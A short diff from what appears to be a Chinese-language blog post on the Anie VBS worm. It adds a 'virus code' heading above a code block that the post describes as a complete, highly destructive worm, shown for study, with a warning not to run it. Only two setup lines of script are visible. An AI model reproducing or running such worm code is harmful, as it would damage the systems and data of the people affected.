@@ -24,6 +24,8 @@ Anie 是一个VBS蠕虫，命名源于其会创建一系列名为 Annie 的文�
 本节代码是一个完整的VBS蠕虫病毒，仅以学习和交流目的展示，其执行后会感染磁盘驱动器、CD刻录机、网络驱动器等，会对系统造成极大破坏。
 请勿复制、传播、执行以及使用本节中代码进行攻击等，否则自行承担一切因不当行为造成的后果及责任。
 
+###病毒代码
+
 {% codeblock %}
 var fso = new ActiveXObject('Scripting.FileSystemObject');
 var Shell = new ActiveXObject('WScript.Shell');
